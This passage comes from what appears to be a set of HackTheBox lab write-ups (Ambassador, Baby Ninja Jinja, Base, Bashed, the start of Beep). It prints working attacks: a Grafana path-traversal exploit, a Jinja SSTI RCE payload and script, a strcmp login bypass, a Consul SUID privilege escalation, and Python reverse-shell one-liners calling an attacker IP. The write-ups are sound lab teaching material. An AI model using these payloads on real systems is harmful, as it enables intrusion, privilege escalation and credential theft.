Server\n3000/tcp open  ppp?\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 302 Found\n|     Cache-Control: no-cache\n|     Content-Type: text/html; charset=utf-8\n|     Expires: -1\n|     Location: /login\n|     Pragma: no-cache\n|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax\n|     X-Content-Type-Options: nosniff\n|     X-Frame-Options: deny\n|     X-Xss-Protection: 1; mode=block\n|     Date: Wed, 16 Nov 2022 18:41:44 GMT\n|     Content-Length: 29\n|     href=\"/login\"&gt;Found&lt;/a&gt;.\n|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 302 Found\n|     Cache-Control: no-cache\n|     Content-Type: text/html; charset=utf-8\n|     Expires: -1\n|     Location: /login\n|     Pragma: no-cache\n|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax\n|     X-Content-Type-Options: nosniff\n|     X-Frame-Options: deny\n|     X-Xss-Protection: 1; mode=block\n|     Date: Wed, 16 Nov 2022 18:41:13 GMT\n|     Content-Length: 29\n|     href=\"/login\"&gt;Found&lt;/a&gt;.\n|   HTTPOptions: \n|     HTTP/1.0 302 Found\n|     Cache-Control: no-cache\n|     Expires: -1\n|     Location: /login\n|     Pragma: no-cache\n|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax\n|     X-Content-Type-Options: nosniff\n|     X-Frame-Options: deny\n|     X-Xss-Protection: 1; mode=block\n|     Date: Wed, 16 Nov 2022 18:41:18 GMT\n|_    Content-Length: 0\n3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.30-0ubuntu0.20.04.2\n|   Thread ID: 11\n|   Capabilities flags: 65535\n|   Some Capabilities: ConnectWithDatabase, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, InteractiveClient, SwitchToSSLAfterHandshake, SupportsTransactions, FoundRows, Speaks41ProtocolOld, SupportsCompression, IgnoreSigpipes, Speaks41ProtocolNew, Support41Auth, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments\n|   Status: Autocommit\n|   Salt: ZS4g*qicR0dA%\\x03:\\x15&gt;\\x066  \n|_  Auth Plugin Name: caching_sha2_password\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 118.46 seconds\n</code></pre> <p>We found 2 webpages, a blog in port 80 and Grafana listening in port 3000. Then we have a MySQL database in port 3306 and SSH in port 22, I will try to focus the webpages first.</p>"},{"location":"HackTheBox/Ambassador/#user-access","title":"User access","text":""},{"location":"HackTheBox/Ambassador/#port-80","title":"Port 80","text":"<p>This page reveals important information. There is a post that explains that every new employee get access to a personal development server like the one we are attacking right now, the user for SSH is <code>developer</code> and the password is given by a user or group called <code>DevOps</code>.</p> <p>Apart from that, not much here.</p>"},{"location":"HackTheBox/Ambassador/#grafana-port-3000","title":"Grafana (Port 3000)","text":"<p>This is a Grafana application for monitoring. It is asking for login but I noticed that the version was v8.2.0. Checking for exploits I found that it is vulnerable to LFI and directory traversal (CVE-2021-43798):</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ searchsploit grafana      \n---------------------------------------------- ---------------------------------\n Exploit Title                                |  Path\n---------------------------------------------- ---------------------------------\nGrafana 7.0.1 - Denial of Service (PoC)       | linux/dos/48638.sh\nGrafana 8.3.0 - Directory Traversal and Arbit | multiple/webapps/50581.py\n---------------------------------------------- ---------------------------------\nShellcodes: No Results\n</code></pre> <p>Testing the exploit for Grafana v8.3.0 it worked like a charm:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Ambassador]\n\u2514\u2500$ python3 CVE-2021-43798.py -H http://10.10.11.183:3000\nRead file &gt; /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\ngrafana:x:113:118::/usr/share/grafana:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\nconsul:x:997:997::/home/consul:/bin/false\n</code></pre> <p>I read the file <code>/etc/grafana/grafana.ini</code> to get some juicy information:</p> <pre><code>...\n[security]\n# disable creation of admin user on first start of grafana\n;disable_initial_admin_creation = false\n\n# default admin user, created on startup\n;admin_user = admin\n\n# default admin password, can be changed before first start of grafana,  or in profile settings\nadmin_password = messageInABottle685427\n...\n</code></pre> <p>We have credentials for Grafana now: <code>admin:messageInABottle685427</code>. Grafana has a datasource to get information from the database listening in port 3306, so maybe we can also get some extra information from it.</p> <p>This datasource appears to be \"Provisioned\" according to Grafana so the information should be in a YAML file. The name of the datasource is <code>mysql.yaml</code> so, according to the documentation, this file is probably under <code>/etc/grafana/provisioning/datasources/mysql.yaml</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Ambassador]\n\u2514\u2500$ python3 CVE-2021-43798.py -H http://10.10.11.183:3000      \nRead file &gt; /etc/grafana/provisioning/datasources/mysql.yaml\napiVersion: 1\n\ndatasources:\n - name: mysql.yaml \n   type: mysql\n   host: localhost\n   database: grafana\n   user: grafana\n   password: dontStandSoCloseToMe63221!\n   editable: false\n</code></pre> <p>Nice! We have credentials for the MySQL server <code>grafana:dontStandSoCloseToMe63221!</code>. We could also get the Grafana Sqlite database and find this there if we were unable to find this YAML.</p>"},{"location":"HackTheBox/Ambassador/#mysql-port-3306","title":"MySQL (Port 3306)","text":"<p>We can now connect to the database with <code>mysql -h 10.10.11.183 -u grafana -p</code> and the password we got before, let's see what we can find:</p> <pre><code>MySQL [(none)]&gt; select schema_name from information_schema.schemata;\n+--------------------+\n| SCHEMA_NAME        |\n+--------------------+\n| mysql              |\n| information_schema |\n| performance_schema |\n| sys                |\n| whackywidget       |\n| grafana            |\n+--------------------+\n6 rows in set (0.067 sec)\n\nMySQL [(none)]&gt; select table_name from information_schema.tables where table_schema=\"whackywidget\";\n+------------+\n| TABLE_NAME |\n+------------+\n| users      |\n+------------+\n1 row in set (0.057 sec)\n\nMySQL [(none)]&gt; select column_name from information_schema.columns where table_name=\"users\";\n+---------------------+\n| COLUMN_NAME         |\n+---------------------+\n| CURRENT_CONNECTIONS |\n| TOTAL_CONNECTIONS   |\n| USER                |\n| pass                |\n| user                |\n+---------------------+\n5 rows in set (0.066 sec)\n\nMySQL [whackywidget]&gt; select user,pass from users;\n+-----------+------------------------------------------+\n| user      | pass                                     |\n+-----------+------------------------------------------+\n| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |\n+-----------+------------------------------------------+\n1 row in set (0.052 sec)\n</code></pre> <p>Oh! Since the password is in base64, it is easy to get the credentials in plain text: <code>developer:anEnglishManInNewYork027468</code>. This credentials allow us to access the machine through SSH and also get the first flag.</p>"},{"location":"HackTheBox/Ambassador/#privilege-escalation","title":"Privilege escalation","text":"<p>After a while I found something interesting: <code>/opt/my-app</code>. Inside this directory, I can see what looks like an app called <code>whackywidget</code> (This explains the MySQL database name). Looking around, I can confirm that this application is using Django. The application is part of a Git repository so I started to check for juicy information in other commits and I found this:</p> <pre><code>developer@ambassador:/opt/my-app/whackywidget$ git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55\ndiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh\nindex 35c08f6..fc51ec0 100755\n--- a/whackywidget/put-config-in-consul.sh\n+++ b/whackywidget/put-config-in-consul.sh\n@@ -1,4 +1,4 @@\n # We use Consul for application config in production, this script will help set the correct values for the app\n-# Export MYSQL_PASSWORD before running\n+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running\n\n-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD\n+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD\n</code></pre> <p>Looks like they are using Consul in production for several things, with that token we should be able to interact with it according to the documentation:</p> <pre><code>developer@ambassador:/opt/my-app/whackywidget$ consul members --token bb03b43b-1d81-d62b-24b5-39540ee469b5\nNode        Address         Status  Type    Build   Protocol  DC   Partition  Segment\nambassador  127.0.0.1:8301  alive   server  1.13.2  2         dc1  default    &lt;all&gt;\n</code></pre> <p>I decided to extract the key store to check for passwords but nothing interesting in there:</p> <pre><code>developer@ambassador:/opt/my-app/whackywidget$ consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5\n[\n    {\n        \"key\": \"test\",\n        \"flags\": 0,\n        \"value\": \"aGVsbG8=\"\n    },\n    {\n        \"key\": \"whackywidget/db/mysql_pw\",\n        \"flags\": 0,\n        \"value\": \"\"\n    }\n]\n</code></pre> <p>At this point you could say, man why focus on Consul? Well it is running as <code>root</code> so if we can get code execution we can easily escalate.</p> <pre><code>developer@ambassador:/opt/my-app/whackywidget$ ps -aux | grep consul\nroot        1091  0.3  3.8 794804 77876 ?        Ssl  Nov16   1:20 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl\n</code></pre> <p>After researching a bit in the documentation I noticed that the configuration directory was writable by the <code>developer</code> group. This means that we can load custom configuration to the Consul agent to make it do cool stuff by just adding <code>hcl</code> or <code>json</code> files to the configuration directory.</p> <pre><code>developer@ambassador:/etc/consul.d$ ls -la\ntotal 24\ndrwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .\ndrwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..\ndrwx-wx---   2 root   developer 4096 Sep 14 11:00 config.d\n-rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env\n-rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl\n-rw-r--r--   1 consul consul     160 Mar 15  2022 README\n</code></pre> <p>I tried to use the <code>exec</code> option in the Consul CLI but was not working. I found some information about it and looks like it require extra configuration but, even though I tried to replicate the configuration given, I was not able to use this option to execute code directly for some reason. Quickly I saw another thing that could be interesting, Consul let you register health checks and basically you can run any code you want as part of them. I wrote this check following the documentation and added it to <code>/etc/consul.d/config.d/check.json</code>:</p> <pre><code>{\n  \"check\": {\n    \"id\": \"pwned\",\n    \"name\": \"pwned\",\n    \"args\": [\n      \"/bin/sh\",\n      \"-c\",\n      \"chmod u+s /bin/bash\"\n    ],\n    \"interval\": \"5s\",\n    \"timeout\": \"1s\"\n  }\n}\n</code></pre> <p>After that, I also created a little <code>hcl</code> file (<code>/etc/consul.d/config.d/custom.hcl</code>) with only one line in it:</p> <pre><code>enable_script_checks = true\n</code></pre> <p>The idea is to enable checks that use scripts, this is off by default so I added it just in case. With everything ready, I reloaded the configuration and after some seconds I was able to pwn the machine!</p> <pre><code>developer@ambassador:/etc/consul.d$ consul reload --token bb03b43b-1d81-d62b-24b5-39540ee469b5\nConfiguration reload triggered\ndeveloper@ambassador:/etc/consul.d$ ls -l /bin/bash\n-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash\ndeveloper@ambassador:/etc/consul.d$ bash -p\nbash-5.0#\n</code></pre> <p>As you can see, the malicious check run and tranformed <code>/bin/bash</code> in a SUID binary we can use to easily get full privileges in the machine.</p>"},{"location":"HackTheBox/Baby_Ninja_Jinja/","title":"Baby Ninja Jinja","text":""},{"location":"HackTheBox/Baby_Ninja_Jinja/#initial-enumeration","title":"Initial enumeration","text":"<p>The page shows a little box to enter your \"ninja\" name and after that it just ask you to wait for approval. Using Gobuster, we can find two new locations in the site: <code>/console</code> and <code>/debug</code>. The first one is a Python console that asks for a password we don't have and the second shows the application code.</p>"},{"location":"HackTheBox/Baby_Ninja_Jinja/#checking-the-code","title":"Checking the code","text":"<p>Looking around it is obvious that the page is vulnerable to SSTI, what is awesome to get potencial RCE (It is also vulnerable to SQL injection but I will focus in the SSTI):</p> <pre><code>def born2pwn(*args, **kwargs):\n\n    name = request.args.get('name', '')\n\n    if name:\n        query_db('INSERT INTO ninjas (name) VALUES (\"%s\")' % name)\n\n        report = render_template_string(acc_tmpl.\n            replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).\n            replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())\n        )\n\n        if session.get('leader'): \n            return report\n\n        return render_template('welcome.jinja2')\n    return func(*args, **kwargs)\n</code></pre> <p>As we can see, after inserting our input in the database, it would just take it back and use it to render a template without sanitizing the content we control. Just one thing, the database is filtering some characters and expressions:</p> <pre><code>def get_db():\n    db = getattr(g, '_database', None)\n    if db is None:\n        db = g._database = sqlite3.connect('/tmp/ninjas.db')\n        db.isolation_level = None\n        db.row_factory = sqlite3.Row\n        db.text_factory = (lambda s: s.replace('{{', '').\n            replace(\"'\", '&amp;#x27;').\n            replace('\"', '&amp;quot;').\n            replace('&lt;', '&amp;lt;').\n            replace('&gt;', '&amp;gt;')\n        )\n    return db\n</code></pre> <p>So, we can't use <code>{{</code> for our SSTI. Using <code>{%</code> in the input field will throw a syntax error but using <code>{{</code> will just work as any other input. Also, make sure to not use <code>'</code>, <code>\"</code>, <code>&lt;</code> or <code>&gt;</code> because the application is encoding them and won't work as expected in the payloads.</p> <p>Looking at the <code>born2pwn</code> function a bit more, looks like if a cookie session exists with a key named <code>leader</code>, the application will show the page for an authenticated user. This could be cool because the page would print our payload as our name (Executing our template code), but since we have to use statements with the <code>{%  %}</code> delimiters, we can't really print anything to the page.</p>"},{"location":"HackTheBox/Baby_Ninja_Jinja/#exploiting-the-ssti","title":"Exploiting the SSTI","text":"<p>Right now we can't see the output of our RCE what makes hard to know if we are really executing something. We can dump the RCE output into the session cookie and then decode it to check the result.</p> <p>The payload to execute the <code>id</code> command would be: <pre><code>&lt;URL&gt;?name={% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&amp;key=leader&amp;command=id\n</code></pre> You can see that to avoid using strings, the payload adds some GET parameters to be able to set the dictionary key and the command to execute.</p> <p>After requesting the page with the payload, we can get the session cookie and decode it with <code>flask-unsign</code> to check our RCE output: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ flask-unsign --decode --cookie '.eJyrVspJTUxJLVKyqlZSSFKyUkoJz8kOCIk09AvxNfB2Ny2LzLXMTg3OTo8ywirurVRbCwDoPBX1.YaKRYA.KYAop-Z0Z7-YE86IhrjIfW8DMNo'\n{'leader': b'uid=65534(nobody) gid=65534(nobody)\\n'}\n</code></pre></p>"},{"location":"HackTheBox/Baby_Ninja_Jinja/#getting-the-flag","title":"Getting the flag","text":"<p>To make the process of executing commands easier I wrote a little Python script: <pre><code>#! /usr/bin/env python3\n\nimport requests\nimport flask_unsign\n\n\nurl = '&lt;URL&gt;/?name={% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&amp;key=leader&amp;command='\n\ncommand = ''\nwhile(command != 'exit'):\n    command = input ('Command to inject: ')\n    response = requests.get(f'{url}{command}')\n    if(response.ok):\n        encoded_cookie = response.cookies['session']\n        decoded_cookie = flask_unsign.decode(encoded_cookie)\n        command_output = decoded_cookie['leader'].decode()\n        print(command_output)\n</code></pre></p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/baby ninja jinja]\n\u2514\u2500$ ./rce.py\nCommand to inject: ls\napp.py\nflag_P54ed\nschema.sql\nstatic\ntemplates\n\nCommand to inject: cat flag_P54ed\nHTB{***}\n\nCommand to inject:\n</code></pre> <p>I tried to get a reverse shell but looks like something is blocking the conections (Maybe is just me being silly).</p>"},{"location":"HackTheBox/Base/","title":"Base","text":""},{"location":"HackTheBox/Base/#nmap-scan","title":"Nmap scan","text":"<p>Let's start with a classic <code>nmap</code> scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- -v --min-rate 1000 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 19:21 EDT\nInitiating Ping Scan at 19:21\nScanning &lt;MACHINE_IP&gt; [4 ports]\nCompleted Ping Scan at 19:21, 0.08s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 19:21\nCompleted Parallel DNS resolution of 1 host. at 19:21, 0.00s elapsed\nInitiating SYN Stealth Scan at 19:21\nScanning &lt;MACHINE_IP&gt; [65535 ports]\nDiscovered open port 22/tcp on &lt;MACHINE_IP&gt;\nDiscovered open port 80/tcp on &lt;MACHINE_IP&gt;\nCompleted SYN Stealth Scan at 19:21, 16.52s elapsed (65535 total ports)\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.051s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 16.70 seconds\n           Raw packets sent: 65539 (2.884MB) | Rcvd: 65536 (2.621MB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22,80 -sC -sV &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 19:23 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.048s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)\n|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)\n|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.81 seconds\n</code></pre> <p>A web server and SSH open. I think we can take a look to the website first.</p>"},{"location":"HackTheBox/Base/#port-80","title":"Port 80","text":"<p>The page contains a home page and a login page in <code>http://&lt;MACHINE_IP&gt;/login/login.php</code>. I decided to use <code>gobuster</code> and looks like directory listing is enabled and we can just check the files under <code>http://&lt;MACHINE_IP&gt;/login/</code>. Also <code>gobuster</code> reported <code>http://&lt;MACHINE_IP&gt;/_uploaded</code> and an upload page at <code>http://&lt;MACHINE_IP&gt;/upload.php</code> but to access it we need to login first.</p> <p>The interesting file in <code>http://&lt;MACHINE_IP&gt;/login/</code> is <code>login.php.swp</code>. This kind of file is used to avoid losing data while editing a document if for some reason the editor crash or whatever. Using <code>strings</code> we can get the code that performs the login process in the <code>login.php</code> file (More or less, I had to fix it a bit):</p> <pre><code>&lt;?php\nsession_start();\nif (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {\n    require('config.php');\n    if (strcmp($username , $_POST['username']) == 0) {\n        if (strcmp($password, $_POST['password']) == 0) {\n            $_SESSION['user_id'] = 1;\n            header(\"Location: upload.php\");\n        } else {\n            print(\"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;\");\n        }\n    } else {\n        print(\"&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;\");\n    }\n}\n</code></pre> <p>Looking a bit how this works, looks like it is using <code>strcmp</code>. If we pass an array as argument instead of a string the <code>strcmp</code> function will just return 0, I wrote a little Python script to perform the login bypass and print the session cookie we can use to open the page in the browser:</p> <pre><code>#! /usr/bin/env python3\n\nimport requests\n\nurl = 'http://&lt;MACHINE_IP&gt;/login/login.php'\ndata = {'username[]': ('user'), 'password[]': ('pass')}\n\nsession = requests.Session()\nsession.post(url, data=data)\nprint(session.cookies.get_dict())\n</code></pre> <p>Using the cookie the script prints, we can access the upload functionality of the page.</p>"},{"location":"HackTheBox/Base/#foothold","title":"Foothold","text":"<p>We can just upload a PHP reverse shell and access it in the <code>/_uploaded/</code> directory. Now we are in the box!</p>"},{"location":"HackTheBox/Base/#in-the-box-as-www-data","title":"In the box as www-data","text":"<p>Well the first thing I wanted to check was the <code>config.php</code> file of the web server:</p> <p><pre><code>www-data@base:/var/www/html/login$ cat config.php \n&lt;?php\n$username = \"admin\";\n$password = \"thisisagoodpassword\";\n</code></pre> After all, a brute force attack could have worked... anyway, looks like there is an user called <code>john</code> in the box, using the password we just found we can login as him.</p>"},{"location":"HackTheBox/Base/#from-john-to-root","title":"From john to root","text":"<p>I decided to drop the reverse shell and use a regular SSH session for stability reasons. First of all, the user flag is under <code>/home/john/user.txt</code>.</p> <p>The user is not in the <code>sudo</code> group but check this:</p> <pre><code>john@base:~$ sudo -l\n[sudo] password for john: \nMatching Defaults entries for john on base:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser john may run the following commands on base:\n    (root : root) /usr/bin/find\n</code></pre> <p>He can execute the command <code>find</code> with <code>sudo</code>. We can abuse this with:</p> <pre><code>john@base:~$ sudo find . -exec /bin/bash \\; -quit\nroot@base:~# \n</code></pre> <p>And we are root! The flag is as usual under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Bashed/","title":"Bashed","text":""},{"location":"HackTheBox/Bashed/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1000 -p- 10.10.10.68\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 11:38 EST\nNmap scan report for 10.10.10.68\nHost is up (0.052s latency).\nNot shown: 65534 closed tcp ports (reset)\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 17.34 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p80 10.10.10.68\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 11:40 EST\nNmap scan report for 10.10.10.68\nHost is up (0.053s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Arrexel's Development Site\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.05 seconds\n</code></pre> <p>Only port 80 open so let's check that website.</p>"},{"location":"HackTheBox/Bashed/#port-80","title":"Port 80","text":"<p>Well the webpage looks like a blog and it only has one article speaking about a tool called <code>phpbash</code>. This tool provides a semi-interactive web shell to the machine and according to the author article, he developed it in the same server that is hosting the page.</p> <p>The article contains an image that looks like reveals the location of the tool in the <code>/uploads</code> directory but it is not there. Since the author said that he developed it, I tried to check something like a <code>/dev</code> directory and it worked! This directory not only has directory listing enabled, it contains the <code>phpbash</code> utility.</p>"},{"location":"HackTheBox/Bashed/#getting-a-reverse-shell","title":"Getting a reverse shell","text":"<p>After some try and error, I was able to get a python reverse shell using:</p> <pre><code>python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.10.14.40\",8000));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n</code></pre> <p>Now we can just upgrade it to a full <code>tty</code>. The user flag is under <code>/home/arrexel/user.txt</code>.</p>"},{"location":"HackTheBox/Bashed/#privilege-escalation","title":"Privilege escalation","text":""},{"location":"HackTheBox/Bashed/#as-www-data","title":"As www-data","text":"<p>Once in the machine, I tried some basic enumeration commands and this is interesting:</p> <pre><code>www-data@bashed:/home/arrexel$ sudo -l\nMatching Defaults entries for www-data on bashed:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on bashed:\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\n</code></pre> <p>The user <code>www-data</code> can execute commands as <code>scriptmanager</code> without password so we can just execute bash as that user to impersonate it:</p> <pre><code>www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash -p\nscriptmanager@bashed:/home/arrexel$\n</code></pre>"},{"location":"HackTheBox/Bashed/#as-scriptmanager","title":"As scriptmanager","text":"<p>I decided to look for all the files owned by this user with:</p> <pre><code>scriptmanager@bashed:/scripts$ find / -user scriptmanager 2&gt; /dev/null \n/scripts\n/scripts/test.py\n/home/scriptmanager\n/home/scriptmanager/.profile\n/home/scriptmanager/.bashrc\n/home/scriptmanager/.nano\n/home/scriptmanager/.bash_history\n/home/scriptmanager/.bash_logout\n/proc/10983\n/proc/10983/task\n...REDACTED...\n</code></pre> <p>The <code>scripts</code> folder looks promising, it contains a Python script and also a file owned by <code>root</code> called <code>test.txt</code>. Checking the script looks like that <code>txt</code> file is the output of the code. </p> <p>Looks like there is a <code>cron</code> job executing the script as <code>root</code> because the file creation date is updated every minute or so. Since we can change the script we could get a reverse shell as the <code>root</code> user changing the script content to this:</p> <pre><code>a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.10.14.40\",8080));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\n</code></pre> <p>Now it is time to spin up a listener and wait...</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.10.14.40] from (UNKNOWN) [10.10.10.68] 42738\n# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>And we got a <code>root</code> shell! The flag is under <code>/root/root.txt</code></p>"},{"location":"HackTheBox/Beep/","title":"Beep","text":""},{"location":"HackTheBox/Beep/#nmap-scan","title":"Nmap scan","text":"<p><pre><code>Nmap scan report for 10.10.10.7\nHost is up (0.039s latency).\nNot shown: 65519 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n25/tcp    open  smtp\n80/tcp    open  http\n110/tcp   open  pop3\n111/tcp   open  rpcbind\n143/tcp   open  imap\n443/tcp   open  https\n879/tcp   open  unknown\n993/tcp   open  imaps\n995/tcp   open  pop3s\n3306/tcp  open  mysql\n4190/tcp  open  sieve\n4445/tcp  open  upnotifyp\n4559/tcp  open  hylafax\n5038/tcp  open  unknown\n10000/tcp open  snet-sensor-mgmt\n\nNmap done: 1 IP address (1 host up) scanned in 22.03 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7\n[sudo] password for kali: \nStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-29 11:13 EST\nNmap scan report for 10.10.10.7\nHost is up (0.040s latency).\n\nPORT      STATE SERVICE    